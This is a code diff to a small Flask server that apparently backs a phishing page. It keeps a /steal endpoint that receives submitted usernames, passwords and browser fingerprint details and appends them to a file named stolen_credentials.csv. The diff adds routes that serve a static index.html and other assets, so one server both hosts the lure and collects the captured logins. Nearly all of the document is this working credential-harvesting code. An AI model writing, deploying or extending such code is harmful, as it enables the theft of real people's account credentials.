@@ -1,4 +1,4 @@
-from flask import Flask, request, jsonify
+from flask import Flask, request, jsonify, send_from_directory
 import csv
 import os
 
@@ -6,18 +6,27 @@ app = Flask(__name__)
 
 LOG_FILE = 'stolen_credentials.csv'
 
-# Create CSV header if file doesn't exist
+# Ensure the log file exists with headers
 if not os.path.exists(LOG_FILE):
     with open(LOG_FILE, 'w', newline='') as f:
         writer = csv.writer(f)
         writer.writerow(['timestamp', 'username', 'password', 'user_agent', 'platform', 'screen', 'timezone'])
+
+@app.route('/')
+def index():
+    # Serve the main HTML file from the static folder
+    return send_from_directory('static', 'index.html')
+
+@app.route('/<path:filename>')
+def static_files(filename):
+    # Serve any other static files (like images) from the static folder
+    return send_from_directory('static', filename)
 
 @app.route('/steal', methods=['POST'])
 def steal():
     try:
         data = request.get_json()
         
-        # Extract fields
         username = data.get('username', 'N/A')
         password = data.get('password', 'N/A')
         ua = data.get('user_agent', 'N/A')
@@ -26,7 +35,6 @@ def steal():
         tz = data.get('timezone', 'N/A')
         ts = data.get('timestamp', 'N/A')
         
-        # Log to CSV
         with open(LOG_FILE, 'a', newline='') as f:
             writer = csv.writer(f)
             writer.writerow([ts, username, password, ua, platform, screen, tz])
